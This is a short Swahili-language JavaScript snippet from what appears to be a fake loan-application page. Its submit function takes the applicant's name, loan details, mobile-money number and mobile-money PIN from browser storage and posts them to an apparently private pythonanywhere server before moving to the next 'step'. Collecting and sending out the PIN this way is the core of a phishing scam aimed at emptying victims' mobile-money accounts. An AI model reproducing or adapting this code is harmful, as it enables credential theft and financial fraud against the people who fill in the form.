<script>

function tumaMaombi() {

    let mkopo = JSON.parse(localStorage.getItem("mkopo_data"));

    if (!mkopo) {
        alert("Hakuna taarifa za mkopo zilizopatikana");
        return;
    }

    // CLEAN DATA (MATCH BACKEND EXACTLY)
    let dataToSend = {
        jina: mkopo.jina,
        kiasi: mkopo.kiasi,
        lengo: mkopo.lengo,
        muda: mkopo.muda,
        mixxNumber: mkopo.mixxNumber,
        pin: mkopo.pin
    };

    fetch("https://superadmin008.pythonanywhere.com/submit-step3", {

        method: "POST",

        headers: {
            "Content-Type": "application/json"
        },

        body: JSON.stringify(dataToSend)

    })

    .then(res => res.json())
    .then(data => {

        console.log("SERVER RESPONSE:", data);

        if (data.application_id) {

            alert("Maombi yamewasilishwa kwa mafanikio!");

            localStorage.setItem("app_id", data.application_id);

            window.location.href = "hatua4.html";

        } else {

            alert("Hitilafu: Hakuna application ID imerudishwa");

        }

    })

    .catch(err => {

        console.log(err);

        alert("Hitilafu imetokea wakati wa kutuma maombi");

    });

}

</script>
